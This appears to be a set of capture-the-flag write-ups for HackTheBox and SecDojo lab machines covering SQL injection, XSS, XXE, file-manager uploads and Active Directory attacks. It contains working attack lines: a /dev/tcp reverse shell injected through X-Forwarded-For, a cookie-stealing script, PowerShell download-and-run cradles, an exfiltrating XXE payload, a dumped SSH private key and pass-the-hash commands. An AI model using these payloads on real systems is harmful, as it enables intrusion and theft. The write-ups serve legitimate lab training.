title: Union
tags: HTB, Writeup, Security, SQLi, Web, PHP
snippet: first nmap scan , only port 80 is open There’s definitely something here our input is checked on db , but how can we inject our sql query on it ?let’s check sqlmap sqlmap didn’t find anythingbut if...
content: first nmap scan , only port 80 is open There’s definitely something here our input is checked on db , but how can we inject our sql query on it ?let’s check sqlmap sqlmap didn’t find anythingbut if we try a manual , UNION injection we can see a different response that may lead to sql injectionwe can use this to enumerate databasethe database used is novemberthe use is uhc@localhostwe an get the tables using' UNION SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES Where table_schema='november'-- so the tables is flagwe can try to read the content of this table using' UNION SELECT * from november.flag-- UHC{F1rst_5tep_2_Qualify} , if we take a look at challenge.php we will notice that the page is asking for a flagif we submit it , we can got ssh open to our ipbut we need credential to ssh into machine , let’s try to read files on the machine using sql injection' UNION SELECT LOAD_FILE('/etc/passwd')-- Now we can read file , let’s read the php files if we check the firewall.php' UNION SELECT LOAD_FILE('/var/www/html/firewall.php')-- we can see that we can inject code in header<?php if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) { $ip = $_SERVER['HTTP_X_FORWARDED_FOR']; } else { $ip = $_SERVER['REMOTE_ADDR']; }; system("sudo /usr/sbin/iptables -A INPUT -s " . $ip . " -j ACCEPT"); ?>if we use HTTP_X_FORWARDED_FOR we can inject our code into this headerX-FORWARDED-FOR: ;bash -c 'exec bash -i &>/dev/tcp/10.10.14.15/1337 <&1';

title: Trick
snippet: as always starting with nmapsudo nmap -sC -sV -T4 -oN nmap_trick -p- 10.10.11.166we got 4 open ports , the 80 hosting a static web page without any interesting functionalities , and we can’t really...
content: as always starting with nmapsudo nmap -sC -sV -T4 -oN nmap_trick -p- 10.10.11.166we got 4 open ports , the 80 hosting a static web page without any interesting functionalities , and we can’t really do anything with SMTP other than enumerating users .let’s enumerate DNSusing nslookup we got a domainI will add it to the /etc/hosts and use it to get more infos from the DNSusing DNS zone transfer we got a new domaindig axfr trick.htb @10.10.11.166looks like a CMS , quick google show us that there’s potential sqliexploit , the public exploit didn’t work , I will use sqlmapsqli confirmedsqlmap -r sqltest.txt --dumpthe informations we got from the sqli until now , are not helpful , I tried to get shell but that didn’t work , so let’s try to read filessqlmap -r sqltest.txt --file-read "/etc/passwd"we can read files try different files but nothing useful , let’s try to read the nginx filessqlmap -r sqltest.txt --file-read "/etc/nginx/sites-available/default"new vhostslet’s add it to the /etc/hostspotential lfiafter testing different payloads , I got this ...//....//....//....//....//....//....//....//....//etc/passwd....//....//....//....//....//....//....//....//....///home/michael/.ssh/id_rsa-----BEGIN OPENSSH PRIVATE KEY----- b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn NhAAAAAwEAAQAAAQEAwI9YLFRKT6JFTSqPt2/+7mgg5HpSwzHZwu95Nqh1Gu4+9P+ohLtz c4jtky6wYGzlxKHg/Q5ehozs9TgNWPVKh+j92WdCNPvdzaQqYKxw4Fwd3K7F4JsnZaJk2G YQ2re/gTrNElMAqURSCVydx/UvGCNT9dwQ4zna4sxIZF4HpwRt1T74wioqIX3EAYCCZcf+ 4gAYBhUQTYeJlYpDVfbbRH2yD73x7NcICp5iIYrdS455nARJtPHYkO9eobmyamyNDgAia/ Ukn75SroKGUMdiJHnd+m1jW5mGotQRxkATWMY5qFOiKglnws/jgdxpDV9K3iDTPWXFwtK4 1kC+t4a8sQAAA8hzFJk2cxSZNgAAAAdzc2gtcnNhAAABAQDAj1gsVEpPokVNKo+3b/7uaC DkelLDMdnC73k2qHUa7j70/6iEu3NziO2TLrBgbOXEoeD9Dl6GjOz1OA1Y9UqH6P3ZZ0I0 +93NpCpgrHDgXB3crsXgmydlomTYZhDat7+BOs0SUwCpRFIJXJ3H9S8YI1P13BDjOdrizE hkXgenBG3VPvjCKiohfcQBgIJlx/7iABgGFRBNh4mVikNV9ttEfbIPvfHs1wgKnmIhit1L aUZ9JF9u/cEfX1ntUFcVNUs96WkZn44yWxTAiN0uFf+IBKa3bCuNffp4ulSt2T/mQYlmi/ KwkWcvbR2gTOlpgLZNRE/GgtEd32QfrL+hPGn3CZdujgD+5aP6L9k75t0aBWMR7ru7EYjC tnYxHsjmGaS9iRLpo79lwmIDHpu2fSdVpphAmsaYtVFPSwf01VlEZvIEWAEY6qv7r455Ge U+38O714987fRe4+jcfSpCTFB0fQkNArHCKiHRjYFCWVCBWuYkVlGYXLVlUcYVezS+ouM0 fHbE5GMyJf6+/8P06MbAdZ1+5nWRmdtLOFKF1rpHh43BAAAAgQDJ6xWCdmx5DGsHmkhG1V PH+7+Oono2E7cgBv7GIqpdxRsozETjqzDlMYGnhk9oCG8v8oiXUVlM0e4jUOmnqaCvdDTS 3AZ4FVonhCl5DFVPEz4UdlKgHS0LZoJuz4yq2YEt5DcSixuS+Nr3aFUTl3SxOxD7T4tKXA fvjlQQh81veQAAAIEA6UE9xt6D4YXwFmjKo+5KQpasJquMVrLcxKyAlNpLNxYN8LzGS0sT AuNHUSgX/tcNxg1yYHeHTu868/LUTe8l3Sb268YaOnxEbmkPQbBscDerqEAPOvwHD9rrgn In16n3kMFSFaU2bCkzaLGQ+hoD5QJXeVMt6a/5ztUWQZCJXkcAAACBANNWO6MfEDxYr9DP OPENSSH PRIVATE KEY-----sudo -lwe can restart the fail2ban service` , let’s check the configuration files of the servicewe have write access over this folder I found this [blog and I followed it to get root] (https://youssef-ichioui.medium.com/abusing-fail2ban-misconfiguration-to-escalate-privileges-on-linux-826ad0cdafb7)I will add a malicious code in the `iptables-multiport.conf fileand I will restart the fail2ban servcie and bruteforce the ssh to trigger the action bansudo /etc/init.d/fail2ban restarthydra -l idk -P /usr/share/seclists/Passwords/darkweb2017-top10000.txt ssh://10.10.11.166once I will get banned , I will get root xD

title: Soccer
tags: htb, writeup, security, linux, web, privesc
snippet: first nmapsudo nmap -sC -sV -p- -oN soccer -T4 10.10.11.194starting with the web port 80nothing interesting at the main page let’s fuzzI found a cms tinyffuf -u http://soccer.htb/FUZZ -w /usr/share...
content: first nmapsudo nmap -sC -sV -p- -oN soccer -T4 10.10.11.194starting with the web port 80nothing interesting at the main page let’s fuzzI found a cms tinyffuf -u http://soccer.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -icwe have tiny file managera quick google search got as the default creds admin admin@123we can upload anything we want , so let’s upload a php file and get rceI used phpbashnothing Interesting , I will run linpeaswe got another subdomain , listening on port 80 after adding it to our /etc/hosts filesame website but new functionalitylet’s create new account and login into the appwe got this /check page , it seems like it’s check for a ticket if it’s available in the databasethe weird thing is I try to intercept this request but I can’t catch it if we want to catch web sockets , we need to start intercepting from the beginning , like from the sign-in part that’s at least what I learned from watching ippsec solving itthere’s a boolean injection via this websocket , if the query i correct returns Exists else return doesn’t existwe can use sqlmap to exploit itsqlmap -u ws://soc-player.soccer.htb:9091 --data '{"id":"80989"}' --dbms mysql --risk 3 --level 5 --batch --dump --thread 10we can ssh as playerfind / -perm -4000 2>/dev/nullsmall research about doas seems like small sudo and we need to find a doas.conf file so we now which command is runningwe can run dstat as rootcat /usr/local/etc/doas.conf`gtfobinsecho 'import os; os.execv("/bin/bash", ["bash"])' > /usr/local/share/dstat/dstat_d0s3nt.py`doas -u root /usr/bin/dstat --d0s3nt

title: Sea
snippet: as always starting with nmapsudo nmap -sC -sV -p- -oN sea 10.10.11.28another htb box , another websitenothing interesting in the website so , let’s move to fuzzingferoxbuster --url http://10.129.1...
content: as always starting with nmapsudo nmap -sC -sV -p- -oN sea 10.10.11.28another htb box , another websitenothing interesting in the website so , let’s move to fuzzingferoxbuster --url http://10.129.115.194 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -C 500,403,404the license pageMIT LicenseCopyright (c) 2019 turboblackPermission is hereby granted, free of charge, to any person obtaining a copyof this software and associated documentation files (the "Software"), to dealin the Software without restriction, including without limitation the rightsto use, copy, modify, merge, publish, distribute, sublicense, and/or sellcopies of the Software, and to permit persons to whom the Software isfurnished to do so, subject to the following conditions:so we are dealing with WondwerCMSthis CVE is interesting since we are on version 3.2.0 (check http://sea.htb/themes/bike/version) CVEthis script exploit an xss to steal credential then use this creds to uplaod backdoored filesI will use the same plugins used in this exploitwget https://github.com/prodigiousMind/revshell/archive/refs/heads/main.zipwe need to change the rev.php file on the zip$VERSION = "1.0";$ip = 'UR OWN IP'; // CHANGE THIS$port = 1337;then I will host a web serverphp -S 0.0.0.0:80python3 exploit.py http://sea.htb/loginURL 10.10.14.224 1337we need to find out a way to send the link to the admin , since the web app is using php` let’s fuzz for the .php fileferoxbuster --url http://10.129.115.194 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -C 500,403,400 -x php once we fill the form , with the malicious link in the website fieldhttp://sea.htb/index.php?page=loginURL?"></form><script+src="http://10.10.14.224/script.js"></script><form+action="in the script.jsnew Image().src='http://IP/index.php?c='+document.cookiein the index.php<?phpif (isset($_GET['c'])) { $list = explode(";", $_GET['c']); foreach ($list as $key => $value) { $cookie = urldecode($value); $file = fopen("cookies.txt", "a+"); fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n"); fclose($file); }}?>we will get the admin cookie in our web serverchanging the cookies , guarantee more privilege in the website , we can now upload pluginwe can install our malicious plugins now , by tampering with the request sent from this buttonGET /?installModule=http://IP/main.zip&directoryName=violet&type=themes&token=a5d00073e50332dd0ca6d448d4ccddc9449c7ae27828bb35cee8112d67debd58 HTTP/1.1by visiting http://sea.htb/themes/revshell-main/rev.phpwe should get shell on our listener this file got my intention/var/www/sea/data/database.jsif we check his content we will find a hash"password": "$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ\/D.GuE4jRIikYiWrD3TM\/PjDnXm4q",we need to remove the escapers to crack it"password": "$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ/D.GuE4jRIikYiWrD3TM/PjDnXm4q",hashcat -a 0 -m 3200 --show hash $2y$10$iOrk210RQSAzNCx6Vyq2X.aJ/D.GuE4jRIikYiWrD3TM/PjDnXm4q:mychemicalromancethis password got us the user amayanother website is running on the port 8080amay@sea:~$ netstat -ntlp Active Internet connections (only servers)Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.1:56005 0.0.0.0:* LISTEN - tcp 0 0 0.0.0.0:80 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.1:8080 ---amay@sea:~$ curl 127.0.0.1:8080Unauthorized accessI will reuse the password of amayI will forward the port 8080 to my machine , so I can see what’s going on in this websitessh -L 7000:localhost:8080 amay@sea.htb -Non http://127.0.0.1:7000/ I tried to read files , like /root/root.txt but that didn’t work so I tried to inject malicious commandto confirm that , I will ping myselffirst listen on the pings``sudo tcpdump -i tun0 icmplog_file=%2Fvar%2Flog%2Fapache2%2Faccess.log;ping+-c+1+10.10.14.224&analyze_log=this worksI will runchmod u+s /bin/bashlog_file=%2Fvar%2Flog%2Fapache2%2Faccess.log;%63%68%6d%6f%64%20%75%2b%73%20%2f%62%69%6e%2f%62%61%73%68&analyze_log=

title: Remote
snippet: starting with nmapsudo nmap -sC -sV -p- -T4 -oN Remote 10.10.10.180nfs,ftp,web , smb and some rpcs protocolsafter taking a look on the smb and ftp , didn’t find something interesting .left web and...
content: starting with nmapsudo nmap -sC -sV -p- -T4 -oN Remote 10.10.10.180nfs,ftp,web , smb and some rpcs protocolsafter taking a look on the smb and ftp , didn’t find something interesting .left web and nfsstarting with nfsshowmount -e 10.10.10.180anyone can mount site_backups (everyone )site_backups is a juicy namesudo mount -t nfs 10.10.10.180:/site_backups mntwhat’s umbraco ?quick google search tell us that this a cms written with C#so this is the backup of the website , it may contains juicy infos . I was wondering , where does this cms store the credential of the users , so I google iteasy rights ?strings UmbracoDev.sdf | lesshere we go goolging this versioneeeem . let’s try this [exploit](https://github.com/Jonoans/Umbraco-RCE)python3 exploit.py -u admin@htb.local -p baconandcheese -w 'http://10.10.10.180/' -i 10.10.14.15 we got access using web , some we will have the SetImpersonatePrvilege so we can use Potatos exploit to get administratorsince this is a windows server 2019 , juicypotato will not work , however we could use [[https://github.com/itm4n/PrintSpoofer]] and https://github.com/antonioCoco/RoguePotatolet’s confirm this the shell we got from the script is unstable so I use metasploit tricks (you know how to do that xD)another way to get system on the box , is by using tools like PowerUP.ps1 and Winpeas.ps1 first let’s host POwerUP.ps1IEX (New-Object Net.Webclient).downloadstring("http://10.10.14.15/PowerUp.ps1") ; Invoke-AllCheckIEX (New-Object Net.Webclient).downloadstring("http://10.10.14.15/PowerUp.ps1") ; Invoke-ServiceAbuse -Name 'UsoSvc'we create a new user with admin privilege , we could abuse the service to get reverse shell directlyby using thissc.exe config UsoSvc binpath= "cmd.exe /c powershell.exe -e "sc.exe start UsoSvc

title: Metatwo
tags: htb, writeup, security, web, linux, wordpress, privesc
snippet: sudo nmap -sC -sV -p- -T4 -oN metatwo 10.10.11.186we got ftp, http and sshI tried ftp anonymous , but didn’t lead us anywherelet’s explore the port 80wordpress , I tried admin:admin but didn’t help...
content: sudo nmap -sC -sV -p- -T4 -oN metatwo 10.10.11.186we got ftp, http and sshI tried ftp anonymous , but didn’t lead us anywherelet’s explore the port 80wordpress , I tried admin:admin but didn’t help if we look around and we tried to read the source page of the wordpress files we will found the following if we google this pluginlet’s crack themhashcat -a 0 -m 400 hashe --user --showwe can login as a managerI will use wpscan to enumerate wordpresswpscan --url http://metapress.htb --enumerate ap --api-token CvPFdrygDgoTsTqclRanY8Xdf0r5iyLSNIP > wpscan_enumerate_apI will use this https://github.com/0xRar/CVE-2021-29447-PoC but I will modifcate I litlein the evil.dtd<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=../wp-config.php"><!ENTITY % init "<!ENTITY &#x25; trick SYSTEM 'http://10.10.14.4:80/index.php?content=%file;'>" >this will get us file on base64 we can use php script to decode it on index.php<?phpif(isset($_GET['content'])){ error_log("\n\n" . base64_decode($_GET['content']));}?>now let’s upload the payload.wavand run our serverphp -S 0.0.0.0:80http://metapress.htb/wp-admin/upload.phpon our php server we got ftp creds , after login I find a file send_email.php and ssh creds on itinteresting directorythis utility used to store password and it encrypts them using the .keys cracking the private key offlinegpg2john gpg > hashes john wordlist=/usr/share/wordlists/rockyou.txt hashespasspie export root

title: Greenhorn
tags: HTB, Writeup, Security, web, linux, PHP, CMS
snippet: starting with nmapsudo nmap -sC -sV -p- -oN greenHorn -T4 10.10.11.25so we got 2 websites , one hosted on the port 80 and the other on the port 3000on the port 3000 , we got gitea , with a public ...
content: starting with nmapsudo nmap -sC -sV -p- -oN greenHorn -T4 10.10.11.25so we got 2 websites , one hosted on the port 80 and the other on the port 3000on the port 3000 , we got gitea , with a public repos contains the source code of pluck cmson the other port we found the pluck cmsfrom the fisrt look , I assume that this websites is the same one as the one in the gitea reposo let’s take look at the source code , quick review of the codethis file got my attention http://greenhorn.htb:3000/GreenAdmin/GreenHorn/src/branch/main/login.phpelse {require_once 'data/settings/pass.php'; //Check if we're already logged in. First, get the token.require_once 'data/settings/token.php';let’s check the data/settings/pass.php<?php$ww = 'd5443aef1b64544f3685bf112f6c405218c573c7279a831b1fe9612e3a4d770486743c5580556c0d838b51749de15530f87fb793afdcc689b6b39024d7790163';?>this files returns a hash to the login.php filethen the cms generate a hash based on the user input and stored it in $pass //If password has been sent, and the bogus input is empty, MD5-encrypt password.if (isset($_POST['submit']) && empty($_POST['bogus'])) {$pass = hash('sha512', $cont1);after that he compares the $ww (hash returned from pass.php) with the $passto confirm that the password is correct//If password is correct, save session-cookie.if (($pass == $ww) && (!isset($login_error))) {$_SESSION[$token] = 'pluck_loggedin';if we crack the hash on the pass.php we will get access to the cms , since the hash is SHA5 , I will try to crack it using crackstationthe CMS is on version 4.7.18` , I quick google search lead me to [this exploit] (https://www.exploit-db.com/exploits/51592)after reading the script .the scenario is the following :user with admin privilege can upload a module (module is just zip with php files) using http://target/pluck/admin.php?action=installmodule, then we can run those files , since we control those files we can use them to get rce .first I will create a zip with two files poc.php,rce.phpzip rce.zip poc.php rce.phphttp://greenhorn.htb/data/modules/rce/poc.phphttp://greenhorn.htb/data/modules/rce/rce.php?cmd=idlet’s get rev shell nowwe have 3 users on this machinescat /etc/passwd | grep sh$I tried to reuse the password of the website , against users and I am junior now!!su juniorthere’s a pdf on junior's homelet’s transfer it to our machine to check it# on the target :		cat 'Using OpenVAS.pdf' > /dev/tcp/10.10.14.234/1337# on the attacker machine :		nc -nvlp 1337 > openvas.pdfthere’s a hidden password in this pdf , we need to unblur it!!at this point I was stuck , so I ask for hints from the HTB discord server we need tools like https://github.com/spipm/Depix to un-blur the passwordbut first we need to convert the pdf to png (wasn’t lucky with taking screenshots),using websites like https://pdfcandy.com will be enoughafter generating the image I use Depix tool to generate un-blurred imagepython3 depix.py -p ../OpenVas.png -s images/searchimages/debruinseq_notepad_Windows10_closeAndSpaced.png -o root.pngand I got this sidefromsidetheothersidesidefromsidetheotherside

title: Forest
snippet: as most of boxes, I will start with nmapsudo nmap -sC -sV -p- -T4 10.10.10.161 -oN FORESTkerberos ,ldap ,smb, rpc that’s a DC but without DNS (port 53 ) which is weird for melet’s check null se...
content: as most of boxes, I will start with nmapsudo nmap -sC -sV -p- -T4 10.10.10.161 -oN FORESTkerberos ,ldap ,smb, rpc that’s a DC but without DNS (port 53 ) which is weird for melet’s check null session against smb and ldap and rpcldap null session is allowednxc ldap 10.10.10.161 -u '' -p '' --users![/home/user/myblog/_site](/assets/img/posts/Forest/Pasted image 20240522202946.pngwe can enumerate users with null session for ldap and rpc let’s create a wordlists and try asreproastingrpcclient 10.10.10.161 -U '' -N -c enumdomusers | cut -d '[' -f 2 | cut -d ']' -f 1asreproastingnxc ldap 10.10.10.161 -u users.txt -p '' --asreproast asreproast hashcat + rockyou.txtenumerate using ldapdomaindumppython3 ldapdomaindump.py --user 'HTB\svc-alfresco' --password s3rvice --outdir ldapdomaindump 10.10.10.161if we took a look on the user svc-alfrescoour controlled user is member of the group Remote Management Usersso we can use evil-winrm to loginevil-winrm -i 10.10.10.161 -u 'svc-alfresco' -p s3rvicewhen I got creds , I tried bloodhound-python but that didn’t work because of the stupid DNS (IT’S ALWAYS DNS!)now I will use sharphound.exeon the windows boxwget -Uri http://10.10.14.15/SharpHound.exe -Outfile SharpHound.exe.\SharpHound.exe -c allnow we have bloodhound.zip files , let’s move it to our machine , the easiest way to do that is by hosting a smbserver using impacketimpacket-smbserver -smb2support share .move 20240522135040_BloodHound.zip \\10.10.14.15\shareand we should have the file on our machinenow we could use bloodhoundgreat article about setting up bloodhound https://blog.spookysec.net/Deploying-BHCE/we could use genericall to add our user to the exchange groupnet rpc group addmem "EXCHANGE WINDOWS PERMISSIONS" "d0s3nt" -U "HTB.LOCAL"/"svc-alfresco"%"s3rvice" -S "10.10.10.161"we could check usingnet rpc group members "EXCHANGE WINDOWS PERMISSIONS" -U "HTB.LOCAL"/"svc-alfresco"%"s3rvice" -S "10.10.10.161"`we can use WriteDacl to add ourself the necssary ACL to perform DCSyncsetting Up this tool was nightmare, I fellow thisI found the script heredacledit.py -action 'write' -rights 'DCSync' -principal 'svc-alfresco' -target-dn 'DC=HTB,DC=LOCAL' 'HTB.LOCAL'/'svc-alfresco':'s3rvice'nb : if it didn’t work re run the net rpc command to add the user to the exchange groupe againimpacket-secretsdump HTB.LOCAL/svc-alfresco:s3rvice@10.10.10.161using the hash we could get shell as SYSTEM using psexecimpacket-psexec HTB.LOCAL/administrator@10.10.10.161 -hashes: 32693b11e6aa90eb43d32c72a07ceea6if we are in a real word scenario we could backtrack our modification bydacledit.py -action 'remove' -rights 'DCSync' -principal 'svc-alfresco'-target-dn 'DC=HTB,DC=LOCAL' 'HTB.LOCAL'/'svc-alfresco':'s3rvice'when I was doing the box powerview function Add-DomainObjectAcl didn’t work and hang on evil-wirm without response after watching ippsec , seems that the command on bloodhound graphing tool wasn’t correct which is weirdthis should workAdd-DomainObjectAcl -TargetIdentity "DC=burmatco,DC=local" -PrincipalIdentity useracct1 -Rights DCSync

title: Delivery
snippet: starting with nmapsudo nmap -sC -sV -p- -T4 -oN delivery 10.10.10.222two ports 80,8065 seems like two websites are hosted hereI found a new subdomain seems like OsTicketlet’s try to open a ticket ...
content: starting with nmapsudo nmap -sC -sV -p- -T4 -oN delivery 10.10.10.222two ports 80,8065 seems like two websites are hosted hereI found a new subdomain seems like OsTicketlet’s try to open a ticket let’s view our ticket 5823990@delivery.htbat this point a tried an SSRF , https://www.exploit-db.com/exploits/49441but didn’t work , let’s check the other websitewe can create accountwe need to verify our mail but the htb boxes are not connected to the internet so how tf we will get an emailgoing back the OSTICKET , maybe we can use this to verify our mail since we have access to the thread of this ticketwe got this once we logged in , we found credsnow we can ssh into the box , and use Pwnkit to get root

title: Blackfield
snippet: sudo nmap -sC -sV -p- 10.10.10.192 -oN blackfield -T4 looks like a DC , so let’s try to enumerateI tried rpcclient null session , and ldap null session , and tried to look for shares. the weird th...
content: sudo nmap -sC -sV -p- 10.10.10.192 -oN blackfield -T4 looks like a DC , so let’s try to enumerateI tried rpcclient null session , and ldap null session , and tried to look for shares. the weird things here is smbclient did show a list of shares , while nxc (using -u ‘‘-p’’ )shows that we don’t have permission to enumerate the shares .when dealing with smb shares the best way to enumerate is smbmapsmbmap -H 10.10.10.192 -u nullwe can read profiles$seems like list of users , let’s create a wordlists with this users and try asreproasting impacket-GetNPUsers Blackfield.local/ -usersfile users.txt	let’s crack ithashcat -a 0 -m 18200 asreperoasting /usr/share/wordlists/rockyou.txt we got support password , let’s run bloodhoundnxc ldap 10.10.10.192 -u 'support' -p '#00^BlackKnight' -c all --bloodhound -ns 10.10.10.192after uploading it to bloodhound we can see that our user has forcechangepassword over audit2020net rpc password "AUDIT2020" "d0s3nt123@" -U "BLACKFIELD.LOCAL"/"support"%"#00^BlackKnight" -S "DC01.BLACKFIELD.LOCAL"nxc smb 10.10.10.192 -u 'AUDIT2020' -p 'd0s3nt123@' let’s enumerate shares using this new credentialsnxc smb 10.10.10.192 -u 'AUDIT2020' -p 'd0s3nt123@' --sharesif we spider this sharenxc smb 10.10.10.192 -u 'AUDIT2020' -p 'd0s3nt123@' --share forencsic -M spider_plusvery juicyafter getting the zip and unzip the files , we can use pypkatz to read the contend of the DUMPpypykatz lsa minidump lsass.DMPwe found couples of hashes but the only one that work was svc_backuplet’s see what we can do with it , back to bloodhoundwe can get shell using evil-winrmevil-winrm -i 10.10.10.192 -u svc_backup -H '9658d1d1dcd9250115e2205d9f48400d'this user is part of backup operator group so we can use it to read any files we want on the box at first I tried to dump the SAM But the administrator hash on it didn’t workreg save HKLM\SAM samreg save HKLM\SYSTEM systemwe can host an smbserver and transfer it very quickbut the SAM database will not lead us anywhere , since the Administrator hash didn’t workso I tried to dump the NTDSfor that I need to used diskshadow.exe utilitywe can use the following script with the diskshadows.exe (I took it from hackthebox academy )before send it to the machine , we need unix2dos so the stupid windows can read our scriptdiskshadow.exe /s disk.txtwe can now host an smbserver and transfer the NTDS.dit easilythen use secretsdump to read the NTDSimpacket-secretsdump -ntds ntds.dit -system SYSTEM.SAV LOCAL

title: Active
snippet: starting with nmapsudo nmap -sC -sV -p- -oN active -T4 10.10.10.100smb null session is allowed , let’s explore open sharesnxc smb 10.10.10.100 -u '' -p '' --shares -M spider_plusGroups.xml is very ...
content: starting with nmapsudo nmap -sC -sV -p- -oN active -T4 10.10.10.100smb null session is allowed , let’s explore open sharesnxc smb 10.10.10.100 -u '' -p '' --shares -M spider_plusGroups.xml is very interestinglet’s connect to this share ,and get this filesmbclient -N \\\\10.10.10.100\\Replication -U ''we found cpassword , we can decrypt it using gpp-decryptgpp-decrypt 'edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ'we got creds for the SVC_TGSlet’s try kerberoasting attack using the creds we foundnxc ldap 10.10.10.100 -u 'active.htb\SVC_TGS' -p 'GPPstillStandingStrong2k18' --kerberoast kerberoastinglet’s try to crack itwe can now get psexec to get shell on the box as administrator

title: Elixir
snippet: Elixir is an easy machine on secdojo platformstarting with nmapsudo nmap 10.8.0.2 -sC -sV -p- -oN nmap -T4so it’s a DC with an open web page on port 80by reading the HTML code of page , I found the...
content: Elixir is an easy machine on secdojo platformstarting with nmapsudo nmap 10.8.0.2 -sC -sV -p- -oN nmap -T4so it’s a DC with an open web page on port 80by reading the HTML code of page , I found the format of users in the DomainEm.Br <!-- Footer--> <footer id="contact" class="py-5 bg-black"> <div class="container px-5"> <p class="m-0 text-center text-white small"><a href="[mailto:Em.Br@secdojo.local](mailto:Em.Br@secdojo.local)" class="text-white">Email us</a></p> <p class="m-0 text-center text-white small">Copyright &copy; Sec-Dojo 2024</p> </div> </footer> <!-- Bootstrap core JS--> <script src="[js/bootstrap.bundle.min.js](view-source:http://10.8.0.2/js/bootstrap.bundle.min.js)"></script> <!-- Core theme JS--> <script src="[js/scripts.js](view-source:http://10.8.0.2/js/scripts.js)"></script></body></html>I make a wordlist with all the users in the website using the same formatEm.BrAd.CrBo.Jothe only attacks that comes in my mind at this moment is asreproastingimpacket-GetNPUsers secdojo.local/ -usersfile users -outputfile asrep hashcat -a 0 asrep /usr/share/wordlists/rockyou.txt$krb5asrep$23$Ad.Cr@SECDOJO.LOCAL:d51be14d3aa50cb4f878950c397fd52c$:RockYou!after enumerating the shares , ADCS nothing really interestingso let’s see bloodhoundRustHound/target/release/rusthound -d secdojo.local -u 'Ad.Cr@secdojo.local' -p 'RockYou!' -ztaking a look at bloodhoundwe can add our controlled user to HELPDESK Groupnet rpc group addmem "HelpDesk" "AD.CR" -U "secdojo.local"/"AD.CR"%"RockYou\!" -S "10.8.0.2"well , I was stuck here for long timeremember : enumeration is iterative process which means when you got new user / group …I should redo the whole enumeration again , (Including ADCS).when running Certipy at first it didn’t catch the ESC3 , after adding my user to helpdesk user it does , because this group has the right to enroll this templatecertipy-ad find -u Ad.Cr -p 'RockYou!' -stdout -dc-ip 10.8.0.2certipy-ad req -u 'Ad.Cr@secdojo.local' -p 'RockYou!' -ca 'SecDojoRootCA' -template 'Enrollement' -dc-ip 10.8.0.2certipy-ad req -u 'Ad.Cr@secodjo.local' -p 'RockYou!' -ca 'SecDojoRootCA' -template 'User' -on-behalf-of 'administrator' -pfx ad.cr.pfx -dc-ip 10.8.0.2 certipy-ad auth -pfx administrator.pfxthe stupid AV will catch psexec :(impacket-smbexec secdojo.local/Administrator@10.8.0.2 -hashes :91c49c1fad45e7b9dbdcd7d3c44a880d
